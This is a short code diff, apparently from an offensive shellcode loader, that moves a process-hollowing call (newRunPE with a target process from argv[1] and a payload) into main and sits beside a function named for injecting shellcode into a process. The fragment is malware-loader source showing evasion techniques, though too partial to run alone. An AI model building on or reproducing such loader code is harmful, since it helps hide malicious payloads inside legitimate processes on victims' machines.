@@ -135,6 +135,12 @@ int main (int argc, char **argv)
 	#endif
 	#endif
 	}
+	
+	#ifdef PROCESS_HOLLOWING
+	// Instanciate target process
+	// Target process specified in first bfg argument argv[1]
+	newRunPE(argv[1], payload);
+	#endif
 
 	return 0;
 }
@@ -265,12 +271,6 @@ DWORD inject_sc_process(unsigned char *shellcode, DWORD pid)
 
 	return 0;	
 }
-#endif
-
-#ifdef PROCESS_HOLLOWING
-	// Instanciate target process
-	// Target process specified in first bfg argument argv[1]
-	newRunPE(argv[1], payload);
 #endif
 
 #ifdef IMAGE
